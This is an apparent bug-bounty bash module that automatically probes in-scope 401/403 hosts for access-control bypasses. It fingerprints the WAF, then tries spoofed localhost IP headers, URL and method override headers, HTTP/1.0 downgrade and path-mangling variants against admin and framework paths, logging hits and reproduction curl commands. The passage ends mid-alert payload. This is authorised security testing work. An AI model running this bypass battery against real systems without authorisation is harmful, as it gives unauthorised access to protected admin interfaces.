#!/usr/bin/env bash
# =============================================================================
# recon_bypass.sh — WAF-aware 401/403 access-control bypass testing
#
# PIPELINE INTEGRATION
#   The triage pipeline scores hosts; everything 401/403 with score>=6 in scope
#   on paying programs becomes a bypass candidate. This module probes them with
#   a WAF-tuned technique battery across tech-driven paths and writes confirmed
#   bypass paths back into ES so they can be acted on (and re-found by other
#   downstream modules: nuclei exposure, dast, params).
#
# WHAT MAKES THIS DIFFERENT FROM THE OLD VERSION
#   - WAF fingerprinted up front (Cloudflare / Akamai / AWS WAF / ModSecurity /
#     Incapsula / Sucuri / F5 / Barracuda / Tengine / generic). Technique order
#     is reweighted per WAF so cheap-and-most-likely-effective probes run first
#     and we short-circuit faster on protected sites.
#   - Multi-path probing. We do not just bang on /. ES `tech` array drives which
#     framework paths to test (Spring → /actuator/*, WordPress → /wp-admin/*,
#     Jenkins → /script, ...). Plus a small set of generic admin paths. Each
#     path tested independently; we store ALL confirmed bypass paths, not just
#     the first.
#   - Expanded technique set: 25+ probes (CF-Connecting-IP, X-ProxyUser-Ip,
#     Client-IP, Host: localhost, Unicode-space prefix, HTTP/1.0 downgrade,
#     chunked, method-case mangling, query/fragment/encoded path tricks).
#   - IP-header combo escalation as a separate phase.
#   - Confidence scoring (0-100), not binary. Body-size delta vs the baseline
#     filters "200 returning the same WAF block page".
#   - Per-path bypass details stored in ES as an array of objects, so reporting
#     and re-verification stays accurate.
#   - Discord embed shows the verified path + a copy-pasteable reproduction
#     curl per the actual technique used.
#
# DETECTION RULES
#   1. Baseline = probe of the path with no extra headers, no redirect follow.
#      If baseline is already 2xx, the path is unrestricted — skip it.
#   2. Bypass candidate = response is 2xx after applying technique.
#   3. Confidence (0-100) — caller's job to threshold:
#         baseline 0 bytes:   size>200 → 60 ; >800 → 80 ; >2000 → 90
#         baseline n bytes:   delta computed; same body or delta<60 → 0
#                             delta>200 and final>500 → 70
#                             delta>800                → 85
#                             plus +10 if response body has tech-positive token
#                                  (admin / dashboard / actuator / etc.)
#      Anything <50 is ignored — almost always a 200 block-page or interstitial.
#   4. We never follow redirects. "302 /login → 200" is not a bypass.
#
# ES OUTPUT (per host)
#   bypass_at                  timestamp (always — used for cooldown)
#   bypass_checked_at          timestamp
#   bypass_confirmed           true|false
#   bypass_waf                 detected WAF tag (or "none")
#   bypass_paths               array of {path, technique, confidence, code, size}
#   bypass_technique           best technique (highest confidence)
#   bypass_top_confidence      best confidence integer
#   triage_signals             "bypass:<technique>" appended
#   triage_score               +8 on confirm (and re-prioritised)
#
# RUNTIME
#   Batch 30 hosts/cycle, 1h daemon interval. Per-host budget keeps us within
#   that 1h window (cap ~25 paths × ~25 techniques each → guarded by global
#   per-host timeout to keep cycle bounded). Cooldown 7 days unless re-promoted.
#
# CONSTRAINTS
#   ES auth: --netrc-file ~/.recon_es_netrc — never -u.
#   No apostrophes inside single-quoted jq strings (would terminate the bash
#   string mid-script). Use "do not" / "it is" in comments and jq blocks.
#   IFS=$'\n\t' — never use ${arr[*]} for space-joining; use printf '%s ' "${a[@]}".
# =============================================================================
set -uo pipefail
IFS=$'\n\t'

log()  { printf '[%s BYPASS] %s\n' "$(date -u '+%Y-%m-%dT%H:%M:%SZ')" "$*" >&2; }
warn() { printf '[%s BYPASS WARN] %s\n' "$(date -u '+%Y-%m-%dT%H:%M:%SZ')" "$*" >&2; }

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/recon_net.sh"
setup_es_netrc
ES_AUTH=(--netrc-file "$HOME/.recon_es_netrc")

BASE_DIR="${BASE_DIR:-$HOME/recon}"
STATE_DIR="${STATE_DIR:-$BASE_DIR/state}"
ES_URL="${ES_URL:-http://127.0.0.1:9200}"
INDEX_NAME="${INDEX_NAME:-recon_alive}"

BYPASS_BATCH="${BYPASS_BATCH:-30}"
BYPASS_MIN_SCORE="${BYPASS_MIN_SCORE:-6}"
BYPASS_COOLDOWN="${BYPASS_COOLDOWN:-604800}"   # 7 days
BYPASS_TIMEOUT="${BYPASS_TIMEOUT:-8}"          # per probe
BYPASS_HOST_BUDGET="${BYPASS_HOST_BUDGET:-180}" # max wall-seconds per host
BYPASS_MIN_CONF="${BYPASS_MIN_CONF:-50}"       # confidence threshold to record
BYPASS_SCORE_BONUS=8

LOCK_FILE="$STATE_DIR/bypass.lock"
mkdir -p "$STATE_DIR"
exec 9>"$LOCK_FILE"
flock -n 9 || { warn "bypass already running"; exit 0; }

es_curl() { curl -sS -m30 "${ES_AUTH[@]}" "$@"; }

cooldown_cutoff="$(date -u -d "-${BYPASS_COOLDOWN} seconds" '+%Y-%m-%dT%H:%M:%SZ' 2>/dev/null || \
  python3 -c "
from datetime import datetime, timedelta
print((datetime.utcnow()-timedelta(seconds=${BYPASS_COOLDOWN})).strftime('%Y-%m-%dT%H:%M:%SZ'))
")"

# ── Target selection ─────────────────────────────────────────────────────────
query="$(jq -nc \
  --argjson min_score "$BYPASS_MIN_SCORE" \
  --arg cutoff "$cooldown_cutoff" \
  --argjson size "$BYPASS_BATCH" '{
    size: $size,
    _source: ["host","url","status_code","triage_score","triage_priority",
              "triage_program","triage_payout_tier","triage_signals",
              "tech","webserver","cdn_name","title"],
    query: {bool: {
      filter: [
        {terms: {status_code: [401, 403]}},
        {term: {triage_in_scope: true}},
        {term: {triage_pays: true}},
        {range: {triage_score: {gte: $min_score}}}
      ],
      must_not: [
        {range: {bypass_at: {gte: $cutoff}}}
      ]
    }},
    sort: [{triage_score: {order: "desc"}}]
  }')"

resp="$(es_curl -H 'Content-Type: application/json' \
  -X POST "$ES_URL/$INDEX_NAME/_search" -d "$query" 2>/dev/null)"

total="$(printf '%s' "$resp" | jq -r '.hits.total.value // 0')"
log "401/403 targets (pays, score>=${BYPASS_MIN_SCORE}, not tested in 7d): $total — testing up to $BYPASS_BATCH"
[[ "$total" -eq 0 ]] && { log "Nothing to test this cycle"; exit 0; }

now_iso="$(date -u '+%Y-%m-%dT%H:%M:%SZ')"
confirmed_count=0
host_count=0

# ── WAF fingerprint ──────────────────────────────────────────────────────────
# Probes once with HEAD, then GET (some WAFs hide headers on HEAD). Returns a
# single tag we use to reorder the technique queue.
_fingerprint_waf() {
  local u="$1" headers tag="none"
  headers="$(curl -sS -m"$BYPASS_TIMEOUT" -I --no-location \
    -A 'Mozilla/5.0 (compatible; recon-bypass/1.0)' \
    "$u" 2>/dev/null | tr -d '\r' | tr '[:upper:]' '[:lower:]')"
  # If HEAD blocked or empty, try GET headers
  if [[ -z "$headers" || "$headers" != *":"* ]]; then
    headers="$(curl -sS -m"$BYPASS_TIMEOUT" -D - -o /dev/null --no-location \
      -A 'Mozilla/5.0 (compatible; recon-bypass/1.0)' \
      "$u" 2>/dev/null | tr -d '\r' | tr '[:upper:]' '[:lower:]')"
  fi
  case "$headers" in
    *"cf-ray:"*|*"server: cloudflare"*|*"__cf_bm"*|*"cf-cache-status"*) tag="cloudflare" ;;
    *"server: akamaighost"*|*"x-akamai-"*|*"akamai-"*)                  tag="akamai" ;;
    *"x-amzn-requestid"*|*"x-amz-cf-id"*|*"x-amz-cf-pop"*)              tag="aws-waf" ;;
    *"x-iinfo:"*|*"x-cdn: incapsula"*|*"incap_ses"*|*"visid_incap"*)    tag="incapsula" ;;
    *"x-sucuri-"*|*"server: sucuri"*)                                   tag="sucuri" ;;
    *"server: barracuda"*|*"barra_counter_session"*)                    tag="barracuda" ;;
    *"server: bigip"*|*"x-waf-event-info"*|*"bigipserver"*)             tag="f5-bigip" ;;
    *"server: mod_security"*|*"mod_security"*)                          tag="modsecurity" ;;
    *"x-sg-edge-id"*|*"server: tengine"*)                               tag="tengine" ;;
    *"server: imperva"*)                                                tag="imperva" ;;
    *"x-fw-debug"*|*"x-distil-cs"*)                                     tag="distil" ;;
    *)                                                                  tag="none" ;;
  esac
  printf '%s' "$tag"
}

# ── Tech-driven path expansion ───────────────────────────────────────────────
# Given the ES `tech` array, emit additional paths to probe alongside /.
# Output: newline-separated relative paths (always include a leading slash).
_tech_paths() {
  local tech_csv="$1"   # comma-separated lowercase
  local out=""
  case ",$tech_csv," in
    *",spring boot,"*|*",spring,"*|*",spring framework,"*)
      out+=$'/actuator\n/actuator/env\n/actuator/health\n/actuator/heapdump\n/actuator/beans\n/actuator/mappings\n/api\n' ;;
  esac
  case ",$tech_csv," in
    *",wordpress,"*)
      out+=$'/wp-admin/\n/wp-admin/admin-ajax.php\n/wp-json/wp/v2/users\n/wp-content/uploads/\n/xmlrpc.php\n' ;;
  esac
  case ",$tech_csv," in
    *",jenkins,"*)
      out+=$'/script\n/manage\n/computer\n/asynchPeople/\n' ;;
  esac
  case ",$tech_csv," in
    *",gitlab,"*)
      out+=$'/admin\n/users\n/api/v4/users\n/explore/projects\n' ;;
  esac
  case ",$tech_csv," in
    *",grafana,"*)
      out+=$'/api/health\n/api/datasources\n/login\n' ;;
  esac
  case ",$tech_csv," in
    *",kibana,"*)
      out+=$'/api/status\n/app/management\n/app/dev_tools\n' ;;
  esac
  case ",$tech_csv," in
    *",kubernetes,"*|*",kube,"*|*",k8s,"*)
      out+=$'/api/v1/namespaces\n/api/v1/pods\n/metrics\n' ;;
  esac
  case ",$tech_csv," in
    *",prometheus,"*)
      out+=$'/metrics\n/targets\n/graph\n' ;;
  esac
  case ",$tech_csv," in
    *",elasticsearch,"*)
      out+=$'/_cluster/health\n/_cat/indices\n/_nodes\n' ;;
  esac
  case ",$tech_csv," in
    *",drupal,"*)
      out+=$'/user/login\n/admin\n/?q=admin\n' ;;
  esac
  case ",$tech_csv," in
    *",php,"*)
      out+=$'/phpinfo.php\n/admin.php\n/login.php\n' ;;
  esac
  case ",$tech_csv," in
    *",tomcat,"*|*",jboss,"*|*",glassfish,"*)
      out+=$'/manager/html\n/host-manager/html\n/admin-console\n' ;;
  esac
  case ",$tech_csv," in
    *",apache,"*)
      out+=$'/server-status\n/server-info\n' ;;
  esac
  case ",$tech_csv," in
    *",nginx,"*|*",tengine,"*)
      out+=$'/nginx_status\n/status\n' ;;
  esac
  case ",$tech_csv," in
    *",graphql,"*)
      out+=$'/graphql\n/graphiql\n/api/graphql\n' ;;
  esac
  case ",$tech_csv," in
    *",swagger,"*|*",openapi,"*)
      out+=$'/swagger\n/swagger-ui\n/api-docs\n/v2/api-docs\n' ;;
  esac
  printf '%s' "$out"
}

# Always-tested generic admin paths (added regardless of tech).
_generic_paths='/admin
/admin/
/administrator
/console
/dashboard
/internal
/private
/api
/api/v1
/api/v2'

# ── Probe primitive ──────────────────────────────────────────────────────────
# Returns "CODE<TAB>SIZE" — no redirect follow, hard timeout, errors → "0\t0".
_probe() {
  local test_url="$1"; shift
  curl -sS -m"$BYPASS_TIMEOUT" \
    --no-location \
    -o /dev/null \
    -w '%{http_code}\t%{size_download}' \
    "$@" "$test_url" 2>/dev/null \
    || printf '0\t0'
}

# Returns confidence integer (0-100). Args: <code> <size> <baseline_size>
_confidence() {
  local code="$1" size="$2" b_size="$3"
  [[ "$code" =~ ^2 ]] || { printf '0'; return; }
  local diff
  if [[ "$b_size" -eq 0 ]]; then
    if   [[ "$size" -ge 2000 ]]; then printf '90'
    elif [[ "$size" -ge 800  ]]; then printf '80'
    elif [[ "$size" -ge 200  ]]; then printf '60'
    else                              printf '0'
    fi
    return
  fi
  diff=$(( size > b_size ? size - b_size : b_size - size ))
  if [[ "$diff" -lt 60 ]]; then printf '0'; return; fi
  if   [[ "$diff" -ge 800 && "$size" -ge 500 ]]; then printf '85'
  elif [[ "$diff" -ge 200 && "$size" -ge 500 ]]; then printf '70'
  elif [[ "$diff" -ge 100 && "$size" -ge 300 ]]; then printf '55'
  else                                                printf '0'
  fi
}

# A small body-content boost (+10) when the bypass response contains tokens
# that distinguish a real authenticated UI from a generic block page. Probe
# is best-effort — done only if base scoring already cleared the threshold.
_body_boost() {
  local test_url="$1"; shift
  local body
  body="$(curl -sS -m"$BYPASS_TIMEOUT" --no-location \
    -o - -w '' "$@" "$test_url" 2>/dev/null | tr '[:upper:]' '[:lower:]' | head -c 8192 || true)"
  [[ -z "$body" ]] && { printf '0'; return; }
  case "$body" in
    *"dashboard"*|*"admin panel"*|*"actuator"*|*"swagger-ui"*|\
    *"graphiql"*|*"prometheus"*|*"jenkins"*|*"gitlab"*|\
    *"phpmyadmin"*|*"server status"*|*"kibana"*) printf '10' ;;
    *) printf '0' ;;
  esac
}

# ── Technique definitions ────────────────────────────────────────────────────
# Each "technique" is a name plus a curl flag array. Generated dynamically so
# the WAF tag can reorder them. Output format per line:
#   name<TAB>flag1<US>flag2<US>flag3...
# (Using ASCII Unit Separator 0x1F as inner delimiter so curl values can carry
# spaces without quoting hell.)
US=$'\x1f'

_emit() { printf '%s\t%s\n' "$1" "$2"; }

# Build the full technique catalog (path-independent, single-shot probes).
_techniques_for_waf() {
  local waf="$1"

  # IP-header singletons, ordered by general efficacy.
  local ip_singletons=(
    "xff-127.0.0.1${US}X-Forwarded-For: 127.0.0.1"
    "x-real-ip${US}X-Real-IP: 127.0.0.1"
    "true-client-ip${US}True-Client-IP: 127.0.0.1"
    "cf-connecting-ip${US}CF-Connecting-IP: 127.0.0.1"
    "x-originating-ip${US}X-Originating-IP: 127.0.0.1"
    "x-remote-ip${US}X-Remote-IP: 127.0.0.1"
    "x-remote-addr${US}X-Remote-Addr: 127.0.0.1"
    "x-client-ip${US}X-Client-IP: 127.0.0.1"
    "x-custom-ip${US}X-Custom-IP-Authorization: 127.0.0.1"
    "x-proxyuser-ip${US}X-ProxyUser-Ip: 127.0.0.1"
    "client-ip${US}Client-IP: 127.0.0.1"
    "x-forwarded-by${US}X-Forwarded-By: 127.0.0.1"
    "forwarded-rfc7239${US}Forwarded: for=127.0.0.1;proto=http"
    "via${US}Via: 1.1 127.0.0.1"
    "x-host-localhost${US}X-Host: localhost"
    "x-forwarded-host-localhost${US}X-Forwarded-Host: localhost"
  )

  # URL-override headers
  local url_override=(
    "x-original-url${US}X-Original-URL: /"
    "x-rewrite-url${US}X-Rewrite-URL: /"
    "x-override-url${US}X-Override-URL: /"
  )

  # Method-override (single-flag is just a header; multi-flag combos handled separately)
  local method_singletons=(
    "method-override-get${US}X-HTTP-Method-Override: GET"
    "method-override-options${US}X-HTTP-Method-Override: OPTIONS"
    "method-override-alt${US}X-Method-Override: GET"
  )

  # Per-WAF ordering hints. The default is "all in catalog order".
  case "$waf" in
    cloudflare)
      # CF-Connecting-IP front-runs; chunked rarely helps; method overrides middling.
      printf '%s\n' \
        "cf-connecting-ip${US}CF-Connecting-IP: 127.0.0.1" \
        "true-client-ip${US}True-Client-IP: 127.0.0.1" \
        "xff-127.0.0.1${US}X-Forwarded-For: 127.0.0.1" \
        "x-real-ip${US}X-Real-IP: 127.0.0.1" \
        "x-host-localhost${US}X-Host: localhost"
      ;;
    akamai)
      printf '%s\n' \
        "true-client-ip${US}True-Client-IP: 127.0.0.1" \
        "xff-127.0.0.1${US}X-Forwarded-For: 127.0.0.1" \
        "x-real-ip${US}X-Real-IP: 127.0.0.1"
      ;;
    aws-waf)
      printf '%s\n' \
        "xff-127.0.0.1${US}X-Forwarded-For: 127.0.0.1" \
        "x-real-ip${US}X-Real-IP: 127.0.0.1" \
        "x-forwarded-host-localhost${US}X-Forwarded-Host: localhost"
      ;;
    f5-bigip|imperva|incapsula|distil|barracuda|sucuri)
      printf '%s\n' \
        "xff-127.0.0.1${US}X-Forwarded-For: 127.0.0.1" \
        "x-originating-ip${US}X-Originating-IP: 127.0.0.1" \
        "x-client-ip${US}X-Client-IP: 127.0.0.1"
      ;;
    *) : ;;
  esac

  # Always emit the full catalog after the WAF-priority head (dedupe handled
  # by short-circuit on first hit per path — order matters for early exit).
  printf '%s\n' "${ip_singletons[@]}"
  printf '%s\n' "${url_override[@]}"
  printf '%s\n' "${method_singletons[@]}"
  # IP-header combo (one shot — three headers at once)
  printf '%s\n' "ip-header-combo${US}X-Forwarded-For: 127.0.0.1${US}X-Real-IP: 127.0.0.1${US}X-Custom-IP-Authorization: 127.0.0.1${US}CF-Connecting-IP: 127.0.0.1"
}

# ── Path mangling variants ───────────────────────────────────────────────────
# Given a base URL and a path, emit alternate request URLs to try with the
# baseline headers (no extra header tricks — purely path-level evasion).
# Output: technique<TAB>full_url
_path_variants() {
  local base="$1" path="$2"
  local trimmed="${path%/}"
  [[ -z "$trimmed" ]] && trimmed="/"
  # Strip duplicate slashes between base and path
  local b="${base%/}"
  printf '%s\t%s\n' "double-slash"           "${b}/${trimmed}/"
  printf '%s\t%s\n' "double-slash-prefix"    "${b}//${trimmed#/}"
  printf '%s\t%s\n' "path-dot"               "${b}${trimmed}/."
  printf '%s\t%s\n' "path-dot-slash"         "${b}${trimmed}/./"
  printf '%s\t%s\n' "trailing-semicolon"     "${b}${trimmed};/"
  printf '%s\t%s\n' "traversal-semicolon"    "${b}${trimmed}/..;/"
  printf '%s\t%s\n' "encoded-slash"          "${b}${trimmed}%2f"
  printf '%s\t%s\n' "encoded-dot"            "${b}${trimmed}%2e"
  printf '%s\t%s\n' "encoded-space"          "${b}${trimmed}%20"
  printf '%s\t%s\n' "encoded-cr"             "${b}${trimmed}%0d"
  printf '%s\t%s\n' "encoded-lf"             "${b}${trimmed}%0a"
  printf '%s\t%s\n' "unicode-space-prefix"   "${b}/%e2%80%82${trimmed#/}"
  printf '%s\t%s\n' "query-bypass"           "${b}${trimmed}?bypass=1"
  printf '%s\t%s\n' "fragment-trick"         "${b}${trimmed}#"
  printf '%s\t%s\n' "trailing-hash-percent"  "${b}${trimmed}%23"
}

# Build the final argv array to pass to curl for a given technique line.
# Sets ${TECH_NAME} and populates ${TECH_ARGS[@]}.
_unpack_technique() {
  local line="$1"
  TECH_NAME="${line%%$'\t'*}"
  local rest="${line#*$'\t'}"
  TECH_ARGS=()
  local IFSb="$IFS"
  IFS="$US"
  local part
  # shellcheck disable=SC2086
  for part in $rest; do
    [[ -z "$part" ]] && continue
    TECH_ARGS+=(-H "$part")
  done
  IFS="$IFSb"
}

# Dedupe the technique list — WAF priority head + catalog can repeat lines.
_techniques_for_waf_dedup() { _techniques_for_waf "$1" | awk '!seen[$0]++'; }

# ── Per-host bypass loop ─────────────────────────────────────────────────────
while IFS= read -r hit; do
  host_start="$(date +%s)"
  host_count=$(( host_count + 1 ))

  host="$(printf '%s' "$hit"     | jq -r '._source.host')"
  url="$(printf '%s' "$hit"      | jq -r '._source.url // ("https://" + ._source.host)')"
  orig_status="$(printf '%s' "$hit" | jq -r '._source.status_code // 403')"
  score="$(printf '%s' "$hit"    | jq -r '._source.triage_score // 0')"
  program="$(printf '%s' "$hit"  | jq -r '._source.triage_program // "?"')"
  tier="$(printf '%s' "$hit"     | jq -r '._source.triage_payout_tier // "?"')"
  tech_csv="$(printf '%s' "$hit" | jq -r '(._source.tech // []) | map(ascii_downcase) | join(",")')"
  webserver="$(printf '%s' "$hit"| jq -r '._source.webserver // ""')"

  # Strip any path from the URL to derive base
  base_url="$(printf '%s' "$url" | sed -E 's@^(https?://[^/]+).*@\1@')"

  log "Host $host_count/$BYPASS_BATCH: $host (orig=$orig_status, score=$score, $program, tech=${tech_csv:-none})"

  # Fingerprint WAF on the root URL once.
  waf="$(_fingerprint_waf "$base_url")"
  log "  waf=$waf  webserver=${webserver:-?}"

  # Build path list: tech-driven + generic, root always last so it does not
  # eat the budget on hosts where the interesting surface is deeper.
  tech_paths="$(_tech_paths "$tech_csv")"
  mapfile -t all_paths < <(printf '%s\n%s\n/\n' "$tech_paths" "$_generic_paths" | awk 'NF && !seen[$0]++')

  # Confirmed bypass records (JSON objects) for this host.
  bypass_records="[]"
  best_tech=""
  best_conf=0

  # Per-host wall-clock budget
  budget_exceeded=0
  for path in "${all_paths[@]}"; do
    [[ "$budget_exceeded" -eq 1 ]] && break
    local_url="${base_url%/}${path}"

    # Baseline probe
    baseline="$(_probe "$local_url")"
    b_code="${baseline%%$'\t'*}"
    b_size="${baseline##*$'\t'}"

    # If the path is already 2xx unrestricted, do not waste budget bypassing it
    if [[ "$b_code" =~ ^2 ]]; then
      continue
    fi
    # If path returns network error (000) or 5xx, skip — not a meaningful target
    if [[ "$b_code" == "0" || "$b_code" =~ ^5 ]]; then
      continue
    fi
    # We only care about 401/403/451/418 style restricted paths
    case "$b_code" in
      401|403|451|418|400|405) : ;;
      *) continue ;;
    esac

    # Header-based techniques
    found_for_path=0
    while IFS= read -r tline; do
      [[ -z "$tline" ]] && continue
      [[ "$found_for_path" -eq 1 ]] && break
      now_elapsed=$(( $(date +%s) - host_start ))
      if [[ "$now_elapsed" -gt "$BYPASS_HOST_BUDGET" ]]; then
        budget_exceeded=1
        break
      fi
      _unpack_technique "$tline"
      result="$(_probe "$local_url" "${TECH_ARGS[@]}")"
      r_code="${result%%$'\t'*}"
      r_size="${result##*$'\t'}"
      conf="$(_confidence "$r_code" "$r_size" "$b_size")"
      [[ "$conf" -lt "$BYPASS_MIN_CONF" ]] && continue
      # Body-boost confirmation (only on plausible hits)
      boost="$(_body_boost "$local_url" "${TECH_ARGS[@]}")"
      conf=$(( conf + boost ))
      [[ "$conf" -gt 100 ]] && conf=100
      log "  HIT path=$path technique=$TECH_NAME code=$r_code size=$r_size conf=$conf"
      rec="$(jq -nc \
        --arg path "$path" --arg tech "$TECH_NAME" \
        --arg code "$r_code" --arg size "$r_size" \
        --argjson conf "$conf" \
        '{path:$path, technique:$tech, code:($code|tonumber), size:($size|tonumber), confidence:$conf}')"
      bypass_records="$(jq -c --argjson r "$rec" '. + [$r]' <<< "$bypass_records")"
      if [[ "$conf" -gt "$best_conf" ]]; then
        best_conf="$conf"; best_tech="$TECH_NAME"
      fi
      found_for_path=1
    done < <(_techniques_for_waf_dedup "$waf")

    # Method tricks (separate from header techniques — need -X)
    if [[ "$found_for_path" -eq 0 ]]; then
      for m in TRACE OPTIONS POST PUT PATCH; do
        now_elapsed=$(( $(date +%s) - host_start ))
        [[ "$now_elapsed" -gt "$BYPASS_HOST_BUDGET" ]] && { budget_exceeded=1; break; }
        result="$(_probe "$local_url" -X "$m")"
        r_code="${result%%$'\t'*}"; r_size="${result##*$'\t'}"
        conf="$(_confidence "$r_code" "$r_size" "$b_size")"
        [[ "$conf" -lt "$BYPASS_MIN_CONF" ]] && continue
        log "  HIT path=$path technique=method-$m code=$r_code size=$r_size conf=$conf"
        rec="$(jq -nc \
          --arg path "$path" --arg tech "method-${m,,}" \
          --arg code "$r_code" --arg size "$r_size" \
          --argjson conf "$conf" \
          '{path:$path, technique:$tech, code:($code|tonumber), size:($size|tonumber), confidence:$conf}')"
        bypass_records="$(jq -c --argjson r "$rec" '. + [$r]' <<< "$bypass_records")"
        if [[ "$conf" -gt "$best_conf" ]]; then
          best_conf="$conf"; best_tech="method-${m,,}"
        fi
        found_for_path=1
        break
      done
    fi

    # HTTP/1.0 downgrade — a single shot
    if [[ "$found_for_path" -eq 0 ]]; then
      now_elapsed=$(( $(date +%s) - host_start ))
      if [[ "$now_elapsed" -le "$BYPASS_HOST_BUDGET" ]]; then
        result="$(_probe "$local_url" --http1.0)"
        r_code="${result%%$'\t'*}"; r_size="${result##*$'\t'}"
        conf="$(_confidence "$r_code" "$r_size" "$b_size")"
        if [[ "$conf" -ge "$BYPASS_MIN_CONF" ]]; then
          log "  HIT path=$path technique=http1.0 code=$r_code size=$r_size conf=$conf"
          rec="$(jq -nc \
            --arg path "$path" --arg tech "http1.0-downgrade" \
            --arg code "$r_code" --arg size "$r_size" \
            --argjson conf "$conf" \
            '{path:$path, technique:$tech, code:($code|tonumber), size:($size|tonumber), confidence:$conf}')"
          bypass_records="$(jq -c --argjson r "$rec" '. + [$r]' <<< "$bypass_records")"
          if [[ "$conf" -gt "$best_conf" ]]; then
            best_conf="$conf"; best_tech="http1.0-downgrade"
          fi
          found_for_path=1
        fi
      fi
    fi

    # Path mangling — each variant tried with baseline headers only
    if [[ "$found_for_path" -eq 0 ]]; then
      while IFS=$'\t' read -r vname vurl; do
        [[ -z "$vname" ]] && continue
        now_elapsed=$(( $(date +%s) - host_start ))
        [[ "$now_elapsed" -gt "$BYPASS_HOST_BUDGET" ]] && { budget_exceeded=1; break; }
        result="$(_probe "$vurl")"
        r_code="${result%%$'\t'*}"; r_size="${result##*$'\t'}"
        conf="$(_confidence "$r_code" "$r_size" "$b_size")"
        [[ "$conf" -lt "$BYPASS_MIN_CONF" ]] && continue
        log "  HIT path=$path technique=$vname code=$r_code size=$r_size conf=$conf"
        rec="$(jq -nc \
          --arg path "$path" --arg tech "$vname" \
          --arg code "$r_code" --arg size "$r_size" \
          --argjson conf "$conf" \
          '{path:$path, technique:$tech, code:($code|tonumber), size:($size|tonumber), confidence:$conf}')"
        bypass_records="$(jq -c --argjson r "$rec" '. + [$r]' <<< "$bypass_records")"
        if [[ "$conf" -gt "$best_conf" ]]; then
          best_conf="$conf"; best_tech="$vname"
        fi
        break
      done < <(_path_variants "$base_url" "$path")
    fi
  done

  paths_hit="$(jq 'length' <<< "$bypass_records")"

  # ── Record outcome ────────────────────────────────────────────────────────
  if [[ "$paths_hit" -gt 0 ]]; then
    confirmed_count=$(( confirmed_count + 1 ))
    bypass_signal="bypass:${best_tech}"
    new_score=$(( score + BYPASS_SCORE_BONUS ))
    new_priority="P1"
    [[ "$new_score" -ge 15 ]] && new_priority="P0"

    painless='
      ctx._source.bypass_at = params.now;
      ctx._source.bypass_confirmed = true;
      ctx._source.bypass_checked_at = params.now;
      ctx._source.bypass_waf = params.waf;
      ctx._source.bypass_paths = params.paths;
      ctx._source.bypass_technique = params.best_tech;
      ctx._source.bypass_top_confidence = params.best_conf;
      if (ctx._source.triage_signals == null) ctx._source.triage_signals = new ArrayList();
      if (!ctx._source.triage_signals.contains(params.signal)) ctx._source.triage_signals.add(params.signal);
      if (ctx._source.triage_score != null) ctx._source.triage_score += params.bonus;
      if (ctx._source.triage_score != null && ctx._source.triage_score >= 15)     ctx._source.triage_priority = "P0";
      else if (ctx._source.triage_score != null && ctx._source.triage_score >= 8) ctx._source.triage_priority = "P1";
    '
    update_body="$(jq -nc \
      --arg now "$now_iso" \
      --arg waf "$waf" \
      --argjson paths "$bypass_records" \
      --arg best_tech "$best_tech" \
      --argjson best_conf "$best_conf" \
      --arg signal "$bypass_signal" \
      --argjson bonus "$BYPASS_SCORE_BONUS" \
      --arg script "$painless" \
      '{script:{lang:"painless",source:$script,
        params:{now:$now,waf:$waf,paths:$paths,best_tech:$best_tech,
                best_conf:$best_conf,signal:$signal,bonus:$bonus}}}')"

    es_curl -H 'Content-Type: application/json' \
      -X POST "$ES_URL/$INDEX_NAME/_update/$host" \
      -d "$update_body" > /dev/null 2>&1 || warn "ES update failed for $host"

    # Discord alert — pick the single highest-confidence record for the embed.
    top_rec="$(jq -c 'sort_by(-.confidence) | .[0]' <<< "$bypass_records")"
    top_path="$(jq -r '.path' <<< "$top_rec")"
    top_tech="$(jq -r '.technique' <<< "$top_rec")"
    top_conf="$(jq -r '.confidence' <<< "$top_rec")"
    top_code="$(jq -r '.code' <<< "$top_rec")"
    repro_url="${base_url%/}${top_path}"

    # Reproduction curl — header-style techniques get -H, mangling techniques
    # get the mangled URL as-is. Best-effort, manual verification expected.
    case "$top_tech" in
      method-*)
        m_upper="${top_tech#method-}"; m_upper="${m_upper^^}"
        repro="curl -sS -I -X $m_upper \"$repro_url\""
        ;;
      http1.0-downgrade)
        repro="curl -sS -I --http1.0 \"$repro_url\""
        ;;
      double-slash|double-slash-prefix|path-dot|path-dot-slash|trailing-semicolon|\
      traversal-semicolon|encoded-slash|encoded-dot|encoded-space|encoded-cr|\
      encoded-lf|unicode-space-prefix|query-bypass|fragment-trick|trailing-hash-percent)
        # Re-derive mangled URL from variant table (cheap)
        repro="curl -sS -I \"$(_path_variants "$base_url" "$top_path" | awk -F'\t' -v n="$top_tech" '$1==n {print $2; exit}')\""
        ;;
      *)
        # Default: assume header technique. Re-derive header line from catalog.
        header_line="$(_techniques_for_waf_dedup "$waf" | awk -F'\t' -v n="$top_tech" '$1==n {print $2; exit}' | tr "$US" '\n' | head -1)"
        repro="curl -sS -I -H \"${header_line:-X-Forwarded-For: 127.0.0.1}\" \"$repro_url\""
        ;;
    esac

    paths_summary="$(jq -r 'sort_by(-.confidence) | .[0:5] | map("  \(.path) → \(.technique) (conf=\(.confidence) code=\(.code))") | join("\n")' <<< "$bypass_records")"

    hook="$(discord_hook bypass)"
    if [[ -n "$hook" ]]; then
      payload="$(jq -nc \
        --arg host "$host" \
        --arg url "$repro_url" \
        --arg tech "$top_tech" \
        --arg path "$top_path" \
        --arg conf "$top_conf" \
        --arg code "$top_code" \
        --arg waf "$waf" \
        --arg status "$orig_status" \
        --arg score "$score" \
        --arg new_score "$new_score" \
        --arg priority "$new_priority" \
        --arg program "$program" \
        --arg tier "$tier" \
        --arg paths_n "$paths_hit" \
        --arg summary "$paths_summary" \
        --arg repro "$repro" \
        --arg ts "$now_iso" '{
          embeds: [{
            title: ("ACCESS CONTROL BYPASS — " + $host),
            url: $url,
            color: 16711680,
            fields: [
              {name: "Best Hit",   value: ($path + "  via  " + $tech + "  (conf " + $conf + ", code " + $code + ")"), inline: false},
              {name: "Was",        value: ($status + " baseline -> " + $code + " bypass"), inline: true},
              {name: "WAF",        value: $waf, inline: true},
              {name: "Paths",      value: ($paths_n + " bypassed"), inline: true},
              {name: "Score",      value: ($score + " -> " + $new_score + " (" + $priority + ")"), inline: true},
              {name: "Program",    value: ($program + " [" + $tier + "]"), inline: true},
              {name: "All Paths",  value: ("```\n" + $summary + "\n```"), inline: false},
              {name: "Reproduce",  value: ("```\n" + $repro + "\n```"), inline: false}
            ],
            footer: {text: "recon_bypass — manual verification recommended"},
            timestamp: $ts
          }]
